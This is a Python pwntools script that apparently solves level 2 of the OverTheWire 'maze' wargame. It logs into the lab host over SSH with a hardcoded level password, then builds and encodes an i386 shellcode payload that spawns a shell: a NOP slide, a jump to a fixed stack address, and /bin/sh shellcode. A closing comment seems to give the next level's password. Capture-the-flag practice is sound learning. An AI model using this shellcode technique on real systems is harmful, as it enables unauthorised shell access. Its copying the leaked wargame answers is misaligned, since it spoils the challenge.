from pwn import *

local_dir = None
remote_binary = None
cloned_binary = None
libc = None
elf = None
def connect(level,pw):
    global remote_binary
    global local_dir
    global cloned_binary
    global port
    global libc
    global elf
    local_dir = "/home/kali/PycharmProjects/maze/maze"+level
    remote_binary = "/maze/maze"+level
    cloned_binary = local_dir+remote_binary
    s = ssh("maze"+level, "176.9.9.172", password=pw, cache=True, port=2225)
    s.libs(remote_binary, local_dir)
    log.info(f"cloned_binary: {cloned_binary}")
    elf = ELF(cloned_binary)
    # libc = ELF(local_dir + "/lib32/libc.so.6")
    context.clear()
    context.binary = cloned_binary
    context.log_file = "/tmp/docgillog"
    return s


connect("2", "fooghihahr")

nopslide = asm(shellcraft.i386.nop()*50)

sh = asm(shellcraft.i386.linux.sh())
log.info(f"sh: {sh}")
log.info(f"sh len: {len(sh)}")

sh_adr = 0xffffd876+25

call_sh_instructions = asm('mov ebx, ' + str(sh_adr) + '; jmp ebx;')
call_instructions_len = len(call_sh_instructions)
log.info(f"call_sh_instructions: {call_sh_instructions}")
log.info(f"call_instructions_len: {call_instructions_len}")

payload = b""
payload += call_sh_instructions
payload += nopslide
payload += sh

log.info(f"payload: {payload}")
log.info(f"payload len: {len(payload)}")

avoid = {b'\x00'}
encoded_payload = pwnlib.encoders.encoder.encode(payload, avoid)

log.info(f"encoded_payload: {encoded_payload}")
log.info(f"encoded_payload len: {len(encoded_payload)}")

payload_file = "docgilpayload"

write(payload_file, encoded_payload)

# scp -P 2225 docgilpayload  maze2@maze.labs.overthewire.org:/tmp/docgilpayload

# beinguthok

